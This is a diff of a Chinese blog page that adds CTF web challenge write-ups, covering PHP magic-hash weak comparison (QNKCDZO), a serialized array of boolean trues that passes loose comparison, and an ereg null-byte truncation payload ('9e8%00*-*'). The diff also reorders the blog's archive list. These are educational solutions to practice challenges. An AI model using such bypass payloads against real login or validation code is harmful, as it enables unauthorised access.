@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">321</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">773</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -414,7 +414,58 @@ r = s.post(url,data={&apos;key&apos;:k})
 print(r.text)
 raw_input(&quot;Press &lt;enter&gt;&quot;)
 </code></pre><p>需要注意的是，提交的flag没必要再用base64编一次再提交了，我把他想的太复杂了，浪费了很多时间</p>
-<h1 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h1><p>进入页面，一大堆报错信息，底下提示index.php.txt，访问这个文件得到源码</p>
+<h1 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h1><p>随便输入一个值，点击enter，发现发送了两个参数，一个是输入的PIN，还有一个是showsource，查看源码？ <br><br>试着改showsoure的值，改为1，发现真的返回了源码 <br></p>
+<pre><code>$a = $_POST[&quot;PIN&quot;];
+if ($a == -19827747736161128312837161661727773716166727272616149001823847) {
+    echo &quot;Congratulations! The flag is $flag&quot;;
+} else {
+    echo &quot;User with provided PIN not found.&quot;; 
+}
+</code></pre><p>只需让输入的值等于if条件中的一长串即可</p>
+<h1 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h1><p>有点查看源代码</p>
+<pre><code>&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt;
+</code></pre><p>要求输入的值经过md5之后等于0，这里可以用php弱类型绕过 <br><br>MD5有几个字符串是以0e开头的，比如QNKCDZO <br><br>算出来的值为<code>0e830400451993494058024219903391</code>，<br>党0e开头的字符串进行比较的时候，会变成科学计数法，即0*10^830400451993494058024219903391=0，即可绕过if条件。之后返回一个url<code>/user.php?fame=hjkleffifer</code><br>直接访问</p>
+<pre><code>$unserialize_str = $_POST[&apos;password&apos;];
+$data_unserialize = unserialize($unserialize_str);
+if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;)
+{
+  print_r($flag);
+}
+</code></pre><p>看到unserialize就知道是反序列化。根据php的弱类型，ture跟任何字符串比较的结果都是true，所以只需要构造数组</p>
+<pre><code>&lt;?php
+$arr = array(&apos;user&apos; =&gt; true,&apos;pass&apos; =&gt; true);
+$b = serialize($arr);
+print_r($b);
+?&gt;
+//a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;}
+</code></pre><p>在首页输入序列号的数组，即可获得flag</p>
+<h1 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h1><p>点击查看源码</p>
+<pre><code>&lt;?php
+if (isset ($_GET[&apos;password&apos;])) {
+    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)
+    {
+        echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;
+    }
+    else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)
+    {
+        if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE)
+        {
+            die(&apos;Flag: &apos; . $flag);
+        }
+        else
+        {
+            echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;);
+        }
+    }
+    else
+    {
+        echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;
+    }
+}
+?&gt;
+</code></pre><p>题目提示ereg（）函数有漏洞，还提醒科学计数法，用于绕过前两个判断条件 <br><br>ereg函数有截断漏洞，用%00可以截断函数执行。用科学计数法可以满足大于9999999且长度小于8。最后只要在字符串的最后加上<code>*-*</code>即可 <br><br>输入</p>
+<pre><code>?password=9e8%00*-*
+</code></pre><h1 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h1><p>进入页面，一大堆报错信息，底下提示index.php.txt，访问这个文件得到源码</p>
 <pre><code>&lt;?php
 if(eregi(&quot;hackerDJ&quot;,$_GET[id])) {
   echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
@@ -450,6 +501,11 @@ Can you authenticate to this website?
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/12/03/geeksycsec/" title= 极客大挑战第⑨季-web-wp >
+                    <div class="nextTitle">极客大挑战第⑨季-web-wp</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -585,7 +641,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#天下武功唯快不破"><span class="toc-number">1.</span> <span class="toc-text">天下武功唯快不破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP大法"><span class="toc-number">2.</span> <span class="toc-text">PHP大法</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#天下武功唯快不破"><span class="toc-number">1.</span> <span class="toc-text">天下武功唯快不破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forms"><span class="toc-number">2.</span> <span class="toc-text">Forms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#天网管理系统"><span class="toc-number">3.</span> <span class="toc-text">天网管理系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Once-More"><span class="toc-number">4.</span> <span class="toc-text">Once More</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP大法"><span class="toc-number">5.</span> <span class="toc-text">PHP大法</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -817,9 +873,40 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 15
+        Total : 16
         </div>
         <!-- search  -->
         
@@ -829,48 +916,6 @@ top:50vh;
     
     
     
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/05</span><a class="archive-post-title" href= "/2018/07/05/problem/" >搭博客过程中遇到的一些问题</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/05/python/" >python学习笔记</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/python-auto-script/" >python自动化脚本学习笔记</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
     
     <div class="archive-year"> Invalid date </div>
     <ul class="year-list">
@@ -891,12 +936,73 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/10</span><a class="archive-post-title" href= "/2018/10/10/CGCTF-wp/" >cgctf-web-wp</a>
+            <span class="archive-post-date">12/03</span><a class="archive-post-title" href= "/2018/12/03/geeksycsec/" >极客大挑战第⑨季-web-wp</a>
         </li>
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/python-auto-script/" >python自动化脚本学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/10</span><a class="archive-post-title" href= "/2018/10/10/CGCTF-wp/" >cgctf-web-wp</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/10/24/shiyan8/" >实验吧-web-wp</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">09/17</span><a class="archive-post-title" href= "/2018/09/17/PKIstudy/" >PKI学习笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/07/dvwa-high/" >基于DVWA的web漏洞原理-high</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/05/python/" >python学习笔记</a>
         </li>
     
     
@@ -938,21 +1044,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/10/24/shiyan8/" >实验吧-web-wp</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/07/dvwa-high/" >基于DVWA的web漏洞原理-high</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/13/phpstudy-1/" >php学习笔记-基础部分</a>
         </li>
     
     
@@ -980,17 +1072,8 @@ top:50vh;
         </li>
     
     
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/15/phpstudy-2/" >php中一些比较实用的技巧</a>
+            <span class="archive-post-date">07/05</span><a class="archive-post-title" href= "/2018/07/05/problem/" >搭博客过程中遇到的一些问题</a>
         </li>
     
     
@@ -1004,7 +1087,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/13/phpstudy-1/" >php学习笔记-基础部分</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/15/phpstudy-2/" >php中一些比较实用的技巧</a>
         </li>
     
     </div>
